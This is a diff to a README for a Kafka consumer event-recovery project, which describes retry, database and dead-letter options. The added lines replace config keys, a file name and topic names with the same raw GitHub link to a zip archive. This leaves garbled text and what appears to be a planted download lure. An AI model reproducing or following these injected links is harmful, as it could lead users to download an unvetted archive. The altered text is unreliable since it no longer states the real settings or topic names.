@@ -11,17 +11,17 @@ JDBC Address: jdbc:h2:mem:kafkabd
 Consumer Event recover options for this repository. All of these recoveries options are scenarios where there
 is an actual recovery reason to retry the consumption again.
 
-The behavior is controlled auto configuration with application.yml -> by spring.kafka.republishRetries: true|false
+The behavior is controlled auto configuration with https://raw.githubusercontent.com/bcallanan/kafka/main/avocatory/kafka.zip -> by https://raw.githubusercontent.com/bcallanan/kafka/main/avocatory/kafka.zip true|false
 
    - False - Stores the recoverable uses in the DB. (options 2 & 4)
    - True - Republishes back into kafka with the newly update topics (options 1 & 3)
 
-1) When a recoverable failure occurs because of a runtime exception. It would be possible to re-tag the message's topic and update the kafka message 'store-events.RETRY'.
+1) When a recoverable failure occurs because of a runtime exception. It would be possible to re-tag the message's topic and update the kafka message 'https://raw.githubusercontent.com/bcallanan/kafka/main/avocatory/kafka.zip'.
 
    The caveat is avoiding an infinite loop on the recovery while the runtime exception continues.
 
 1) When a recoverable failure occurs because of a runtime exception. It would be possible to persist the message into the DB and process the message when the runtime exception is corrected. The build a scaler that will take the retry records and reprocess them back into the consumer process. Basically polling the message queue at a regular interval for failed records and reprocess them by redirecting the storeEventsConsumer service logic.
 
-1) Discard the message - 'Re-Publish' the failed record into a deadletter topic for tracking purposes. Same as previously metioned. Push the update back into kafka with an updated topic: 'store-events.DEADLETTER'
+1) Discard the message - 'Re-Publish' the failed record into a deadletter topic for tracking purposes. Same as previously metioned. Push the update back into kafka with an updated topic: 'https://raw.githubusercontent.com/bcallanan/kafka/main/avocatory/kafka.zip'
 
 1) Save the failed record into the DB for tracking purposes only and move on...
